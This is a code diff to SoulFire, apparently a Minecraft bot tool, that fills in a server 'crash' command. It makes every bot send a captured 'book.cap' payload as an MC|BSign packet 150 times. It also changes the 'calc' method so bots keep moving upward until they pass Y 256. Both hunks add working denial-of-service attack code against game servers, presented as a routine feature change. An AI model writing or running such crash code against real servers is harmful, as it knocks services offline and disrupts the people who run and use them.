@@ -20,6 +20,7 @@ package net.pistonmaster.soulfire.server;
 import com.github.steveice10.mc.protocol.data.game.entity.RotationOrigin;
 import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
 import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
+import com.github.steveice10.mc.protocol.packet.common.serverbound.ServerboundCustomPayloadPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
 import com.mojang.brigadier.Command;
@@ -310,7 +311,19 @@ public class ServerCommandManager {
 
                             return switch (method) {
                                 case "book" -> {
-                                    log.error("Book crash not implemented yet!");
+                                    try {
+
+                                        byte[] data = Files.readAllBytes(Path.of("book.cap"));
+                                        ServerboundCustomPayloadPacket packet = new ServerboundCustomPayloadPacket("MC|BSign", data);
+                                        forEveryBot((bot) -> {
+                                            for (int i = 0; i < 150; i++) {
+                                                bot.sessionDataManager().sendPacket(packet);
+                                            }
+                                            return Command.SINGLE_SUCCESS;
+                                        });
+                                    } catch (IOException e) {
+                                        log.error("Failed to read book.cap", e);
+                                    }
                                     yield Command.SINGLE_SUCCESS;
                                 }
                                 case "calc" -> {
@@ -326,7 +339,7 @@ public class ServerCommandManager {
                                         double botY = bot.sessionDataManager().clientEntity().y();
                                         double botZ = bot.sessionDataManager().clientEntity().z();
 
-                                        for (int i = 0; i < 36; i++) {
+                                        while (botY < 256) {
                                             botY += 9;
                                             ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
                                                     true,
